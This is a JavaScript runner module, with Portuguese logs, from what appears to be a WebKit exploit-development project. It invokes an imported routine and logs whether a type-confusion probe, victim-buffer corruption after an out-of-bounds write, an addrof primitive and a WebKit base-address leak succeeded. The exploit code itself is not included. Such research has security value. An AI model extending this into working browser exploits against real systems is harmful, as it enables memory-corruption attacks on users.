// js/script3/runAllAdvancedTestsS3.mjs (Adaptado para PostOOB Analysis)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_PostOOB";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43(); // Chama a nova versão

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT; // Nome do módulo pode mudar

    if (result.errorOccurred) {
        logS3(`  RUNNER R43(PostOOB): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R43(PostOOB): Completou. Melhor OOB usado: ${result.oob_value_of_best_result || 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R43(PostOOB): Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak_detail", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        // Os resultados de addrof e webkitleak não são o foco, mas são mantidos na estrutura
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;
        // Novo campo para análise do buffer
        const postOOBAnalysis = result.post_oob_victim_buffer_analysis_best_result || result.iteration_results_summary?.find(r => r.oob_value === result.oob_value_of_best_result)?.post_oob_victim_buffer_analysis;


        logS3(`  RUNNER R43(PostOOB): Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln_potential" : "warn", FNAME_RUNNER);

        if (postOOBAnalysis) {
            logS3(`  RUNNER R43(PostOOB): Análise Pós-OOB do Buffer Vítima (Best):`, "info_emphasis", FNAME_RUNNER);
            logS3(`    Padrão de preenchimento encontrado: ${postOOBAnalysis.buffer_fill_pattern_found}`, postOOBAnalysis.buffer_fill_pattern_found ? "good" : "vuln_potential", FNAME_RUNNER);
            logS3(`    Notas: ${postOOBAnalysis.notes}`, "info", FNAME_RUNNER);
            if (postOOBAnalysis.buffer_initial_head && postOOBAnalysis.buffer_initial_head.length > 0) {
                 logS3(`    Cabeçalho do Buffer (Best Iter): ${postOOBAnalysis.buffer_initial_head.slice(0,8).map(v => "0x"+v.toString(16)).join(", ")}...`, "leak_detail", FNAME_RUNNER);
            }
        } else {
            logS3(`  RUNNER R43(PostOOB): Detalhes da Análise Pós-OOB do Buffer Vítima não disponíveis.`, "warn", FNAME_RUNNER);
        }

        // Addrof e WebKitLeak logs (espera-se que falhem ou não sejam tentados)
        if (addrofResult) {
            logS3(`  RUNNER R43(PostOOB): Teste Addrof (Best): ${addrofResult.msg}`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (webkitLeakResult) {
            logS3(`  RUNNER R43(PostOOB): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg}`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        }


        // Título da página
        let finalTitleSegment = "No TC Confirmed or Buffer Unchanged";
        if (heisenbugSuccessfullyDetected && postOOBAnalysis && !postOOBAnalysis.buffer_fill_pattern_found) {
             finalTitleSegment = "TC & Buffer Corrupt!";
        } else if (heisenbugSuccessfullyDetected) {
            finalTitleSegment = "TC OK, Buffer Unchanged";
        } else if (postOOBAnalysis && !postOOBAnalysis.buffer_fill_pattern_found) {
            finalTitleSegment = "Buffer Corrupt, No TC";
        }
        document.title = `${module_name_for_title}_R43_PostOOB: ${finalTitleSegment}`;


        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER R43(PostOOB): Sumário completo das iterações:`, "info", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
                const bufferCorrupted = iter_sum.post_oob_victim_buffer_analysis && !iter_sum.post_oob_victim_buffer_analysis.buffer_fill_pattern_found;
                let logMsg = `    Iter ${index + 1} (OOB ${iter_sum.oob_value}): TC=${tcSuccess}, BufferCorrupt=${bufferCorrupted}`;
                if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
                logS3(logMsg, "info", FNAME_RUNNER);
            });
        }
    } else {
        document.title = `${module_name_for_title}_R43_PostOOB: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_PostOOB`;
    logS3(`==== INICIANDO Script 3 R43_PostOOB (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43();
    logS3(`\n==== Script 3 R43_PostOOB (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;

    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) &&
        !document.title.includes("Corrupt") && // Ajustar condições do título
        !document.title.includes("OK") &&
        !document.title.includes("ERR") &&
        !document.title.includes("Invalid")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43_PostOOB_Done`;
    }
}
